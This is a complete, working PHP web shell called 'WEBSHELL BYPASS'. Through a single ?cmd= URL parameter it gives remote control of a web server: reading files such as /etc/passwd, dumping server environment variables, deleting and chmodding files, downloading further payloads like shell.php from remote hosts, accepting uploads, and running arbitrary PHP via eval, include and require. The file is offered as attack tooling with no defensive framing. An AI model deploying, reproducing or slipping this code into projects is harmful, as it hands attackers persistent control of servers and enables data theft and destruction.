<?php
// ============================================================
// WEBSHELL BYPASS - ONE PARAMETER (?cmd=command)
// Support: ls, cat, pwd, cd, wget, find, exec, info, upload, rm, mv, cp, mkdir, rmdir, chmod, whoami, id, uname, hostname, env, phpinfo, head, tail, grep, curl, include, require, touch, ln
// Usage: ?cmd=ls
//        ?cmd=cat /etc/passwd
//        ?cmd=wget https://example.com/shell.php
// ============================================================

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $parts = explode(' ', $cmd, 2);
    $action = $parts[0];
    $arg = isset($parts[1]) ? $parts[1] : '';
    
    function _exec($code) { ob_start(); eval($code); return ob_get_clean(); }
    function _out($msg) { echo $msg."\n"; }
    
    switch($action) {
        
        // ===== FILE & DIRECTORY =====
        case 'ls':
            $path = $arg ?: getcwd();
            if(!is_dir($path)) { _out("Not a directory: $path"); break; }
            foreach(scandir($path) as $f) {
                if($f=='.'||$f=='..') continue;
                $p = $path.'/'.$f;
                $type = is_dir($p) ? '📁' : (is_link($p) ? '🔗' : '📄');
                $size = is_file($p) ? ' ('.number_format(filesize($p)).'B)' : '';
                _out("$type $f$size");
            }
            break;
            
        case 'cat':
            $f = $arg ?: getcwd();
            echo file_exists($f) ? file_get_contents($f) : "File not found: $f";
            break;
            
        case 'head':
            $parts2 = explode(' ', $arg, 2);
            $f = $parts2[0];
            $n = isset($parts2[1]) ? (int)$parts2[1] : 10;
            if(!file_exists($f)) { _out("File not found: $f"); break; }
            echo implode('', array_slice(file($f), 0, $n));
            break;
            
        case 'tail':
            $parts2 = explode(' ', $arg, 2);
            $f = $parts2[0];
            $n = isset($parts2[1]) ? (int)$parts2[1] : 10;
            if(!file_exists($f)) { _out("File not found: $f"); break; }
            echo implode('', array_slice(file($f), -$n));
            break;
            
        case 'grep':
            $parts2 = explode(' ', $arg, 2);
            $f = $parts2[0];
            $p = isset($parts2[1]) ? $parts2[1] : '.*';
            if(!file_exists($f)) { _out("File not found: $f"); break; }
            $content = file_get_contents($f);
            preg_match_all('/'.$p.'/i', $content, $matches);
            echo implode("\n", $matches[0] ?: ['No match']);
            break;
            
        case 'pwd':
            echo getcwd();
            break;
            
        case 'cd':
            $target = $arg ?: '/';
            chdir($target) ? _out("Changed to: ".getcwd()) : _out("Cannot change to: $target");
            break;
            
        case 'mkdir':
            mkdir($arg, 0755, true) ? _out("Created: $arg") : _out("Failed: $arg");
            break;
            
        case 'rmdir':
            rmdir($arg) ? _out("Removed: $arg") : _out("Failed: $arg");
            break;
            
        case 'rm':
            if(!file_exists($arg)) { _out("Not found: $arg"); break; }
            if(is_dir($arg)) {
                $files = array_diff(scandir($arg), ['.','..']);
                foreach($files as $f) { $p = $arg.'/'.$f; is_dir($p) ? rmdir($p) : unlink($p); }
                rmdir($arg) ? _out("Removed: $arg") : _out("Failed to remove: $arg");
            } else {
                unlink($arg) ? _out("Removed: $arg") : _out("Failed: $arg");
            }
            break;
            
        case 'mv':
            $parts2 = explode(' ', $arg, 2);
            rename($parts2[0], $parts2[1]) ? _out("Moved") : _out("Failed");
            break;
            
        case 'cp':
            $parts2 = explode(' ', $arg, 2);
            copy($parts2[0], $parts2[1]) ? _out("Copied") : _out("Failed");
            break;
            
        case 'chmod':
            $parts2 = explode(' ', $arg, 2);
            chmod($parts2[1], octdec($parts2[0])) ? _out("Chmod $parts2[0]: $parts2[1]") : _out("Failed");
            break;
            
        case 'ln':
            $parts2 = explode(' ', $arg, 2);
            symlink($parts2[0], $parts2[1]) ? _out("Symlink created") : _out("Failed");
            break;
            
        case 'touch':
            touch($arg) ? _out("Touched: $arg") : _out("Failed");
            break;
            
        case 'find':
            $parts2 = explode(' ', $arg, 2);
            $dir = $parts2[0] ?: getcwd();
            $pat = isset($parts2[1]) ? $parts2[1] : '.*';
            if(!is_dir($dir)) { _out("Not a directory: $dir"); break; }
            $r = [];
            $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
            foreach($iter as $f) if(preg_match('/'.$pat.'/i', $f->getFilename())) $r[] = $f->getPathname();
            echo implode("\n", $r) ?: "No files found";
            break;
            
        // ===== SYSTEM INFO =====
        case 'whoami':
            echo function_exists('get_current_user') ? get_current_user() : 'unknown';
            break;
            
        case 'id':
            $u = function_exists('posix_getuid') ? posix_getuid() : '?';
            echo "UID: $u | User: ".(function_exists('get_current_user')?get_current_user():'unknown');
            break;
            
        case 'uname':
            echo php_uname('a');
            break;
            
        case 'hostname':
            echo php_uname('n');
            break;
            
        case 'env':
            foreach($_SERVER as $k=>$v) echo "$k: $v\n";
            break;
            
        case 'info':
            echo "PHP: ".phpversion()."\nUser: ".(function_exists('get_current_user')?get_current_user():'unknown')."\nServer: ".($_SERVER['SERVER_SOFTWARE']??'unknown')."\nDocumentRoot: ".($_SERVER['DOCUMENT_ROOT']??'unknown')."\nDisabled: ".(ini_get('disable_functions')?:'none');
            break;
            
        case 'phpinfo':
            phpinfo();
            break;
            
        // ===== NETWORK =====
        case 'wget':
            $parts2 = explode(' ', $arg, 2);
            $url = $parts2[0];
            $fname = isset($parts2[1]) ? $parts2[1] : basename($url);
            $data = @file_get_contents($url);
            if($data !== false) { file_put_contents($fname, $data); _out("Downloaded: $fname (".number_format(strlen($data))."B)"); }
            else _out("Failed: $url");
            break;
            
        case 'curl':
            echo @file_get_contents($arg) ?: "Failed to fetch: $arg";
            break;
            
        // ===== PHP EXECUTION =====
        case 'exec':
            echo _exec($arg);
            break;
            
        case 'eval':
            echo eval($arg);
            break;
            
        case 'include':
            include($arg);
            break;
            
        case 'require':
            require($arg);
            break;
            
        // ===== UPLOAD =====
        case 'upload':
            if(isset($_FILES['file'])) {
                $target = $_FILES['file']['name'];
                move_uploaded_file($_FILES['file']['tmp_name'], $target) ? _out("Uploaded: $target") : _out("Upload failed");
            } else {
                _out('No file. Use: <form method="post" enctype="multipart/form-data" action="?cmd=upload"><input type="file" name="file"><input type="submit"></form>');
            }
            break;
            
        // ===== HELP =====
        case 'help':
        default:
            echo "
Commands: ls, cat, head, tail, grep, pwd, cd, mkdir, rmdir, rm, mv, cp, chmod, ln, touch, find,
          whoami, id, uname, hostname, env, info, phpinfo, wget, curl, exec, eval, include, require, upload
Examples:
  ?cmd=ls
  ?cmd=cat /etc/passwd
  ?cmd=wget https://example.com/shell.php shell.php
  ?cmd=find /var/www .php
  ?cmd=exec echo 'Hello'
";
            break;
    }
} else {
    echo "=== WEBSHELL BYPASS ===\n";
    echo "Usage: ?cmd=command\n";
    echo "Try: ?cmd=help\n";
}
?>